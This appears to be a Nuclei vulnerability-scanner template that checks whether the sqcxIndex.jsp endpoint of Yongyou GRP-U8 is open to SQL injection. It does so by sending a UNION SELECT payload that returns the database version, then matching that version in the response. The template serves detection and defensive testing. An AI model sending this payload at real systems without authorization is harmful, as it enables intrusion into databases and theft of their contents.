id: yongyou-grp-u8-sqcxindex-sqli
info:
  name: Yongyou GRP-U8 sqcxIndex SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    Detects SQL Injection vulnerability in Yongyou GRP-U8 sqcxIndex.jsp endpoint.

http:
  - method: POST
    path:
      - "{{BaseURL}}/u8qx/sqcxIndex.jsp"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: | 
      11=11&key=2%25')+union+select+@@version,111*111--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "Microsoft SQL Server"
          - "Windows NT"
          - "12321"
